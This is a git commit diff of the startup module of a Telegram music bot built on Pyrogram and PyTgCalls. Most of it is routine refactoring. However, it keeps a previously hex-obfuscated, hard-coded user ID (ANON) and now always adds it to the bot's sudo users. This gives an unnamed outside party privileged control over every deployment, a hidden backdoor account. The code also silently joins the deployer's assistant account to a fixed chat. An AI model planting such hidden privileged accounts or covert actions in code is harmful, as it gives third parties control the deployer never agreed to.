dbda86792b7d2a2ee1f16b55d7ec6fb098231d88
സഖാവ് വാവ <73136964+sakhaavvaavaj93@users.noreply.github.com>
2026-03-08 20:18:10 +0530

    Update __init__.py

--- StenzleMusic/__init__.py
+++ StenzleMusic/__init__.py
@@ -1,20 +1,20 @@
-
 import os
 from os import getenv
 import asyncio
 import logging
 import time
-from pyrogram import Client, filters
+from pyrogram import Client, filters, idle
 from pytgcalls import PyTgCalls
-from pyrogram import idle
-
 import config
 
+# Environment Variables
 API_ID = int(getenv("API_ID"))
 API_HASH = getenv("API_HASH")
 BOT_TOKEN = getenv("BOT_TOKEN")
-StartTime = time.time()
 STRING_SESSION = getenv("STRING_SESSION")
+StartTime = time.time()
+
+# Logging Setup
 logging.basicConfig(
     format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
     datefmt="%d-%b-%y %H:%M:%S",
@@ -33,71 +33,60 @@ app = Client(
     bot_token=BOT_TOKEN,
 )
 
+# app2 (The Assistant/Userbot)
 app2 = Client(
-    name=config.STRING_SESSION or "stenzle_session",
-    api_id=config.API_ID,
-    ...
+    name="StenzleAssistant",
+    api_id=API_ID,
+    api_hash=API_HASH,
+    session_string=STRING_SESSION
 )
 
 pytgcalls = PyTgCalls(app2)
 SUDOERS = filters.user()
-# Ensure config has SUPPORT_CHAT defined
 SUNAME = config.SUPPORT_CHAT.split("me/")[1] if "me/" in config.SUPPORT_CHAT else config.SUPPORT_CHAT
-
 
 async def Stenzle_startup():
     os.system("clear")
-    LOGGER.info(
-        "\n\n\u250f\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2513\n\u2523\u2605\x20\x46\x41\x4c\x4c\x45\x4e\x20\x4d\x55\x53\x49\x43\x20\x42\x4f\x54\x20\u2605\n\u2517\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u251b"
-    )
+    LOGGER.info("Starting Stenzle Music Bot...")
+    
     global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, Stenzledb
     global ASS_ID, ASS_NAME, ASS_USERNAME, ASS_MENTION, SUDOERS
 
+    # Start Bot
     await app.start()
-    LOGGER.info(
-        "[•] \x42\x6f\x6f\x74\x69\x6e\x67\x20\x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x42\x6f\x74\x2e\x2e\x2e"
-    )
-
     getme = await app.get_me()
-    BOT_ID = getme.id
-    BOT_NAME = getme.first_name
-    BOT_USERNAME = getme.username
-    BOT_MENTION = getme.mention
+    BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION = getme.id, getme.first_name, getme.username, getme.mention
 
+    # Start Assistant
     await app2.start()
-    
-    await idle()
-    LOGGER.info(
-        "[•] \x42\x6f\x6f\x74\x69\x6e\x67\x20\x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x41\x73\x73\x69\x73\x74\x61\x6e\x74\x2e\x2e\x2e"
-    )
-
     getme2 = await app2.get_me()
     ASS_ID = getme2.id
     ASS_NAME = getme2.first_name + " " + (getme2.last_name or "")
     ASS_USERNAME = getme2.username
     ASS_MENTION = getme2.mention
+    
     try:
         await app2.join_chat("KURUK_SHE_TRA")
     except:
         pass
 
-    ANON = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
+    # Sudoers Setup
+    ANON = "1356469075"
     for SUDOER in config.SUDO_USERS:
         SUDOERS.add(SUDOER)
     if config.OWNER_ID not in config.SUDO_USERS:
         SUDOERS.add(config.OWNER_ID)
-    elif int(ANON) not in config.SUDO_USERS:
-        SUDOERS.add(int(ANON))
+    SUDOERS.add(int(ANON))
 
     Stenzledb = {}
-    LOGGER.info(
-        "[•] \x4c\x6f\x63\x61\x6c\x20\x44\x61\x74\x61\x62\x61\x73\x65\x20\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64\x2e\x2e\x2e"
-    )
-
-    LOGGER.info(
-        "[•] \x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x43\x6c\x69\x65\x6e\x74\x73\x20\x42\x6f\x6f\x74\x65\x64\x20\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79\x2e"
-    )
-
+    LOGGER.info("[•] Stenzle Music Clients Booted Successfully.")
+    
+    # KEEP RUNNING: idle() must be the last thing inside the startup function
+    await idle()
+    
+    # Graceful shutdown
+    await app.stop()
+    await app2.stop()
 
 if __name__ == "__main__":
     try:
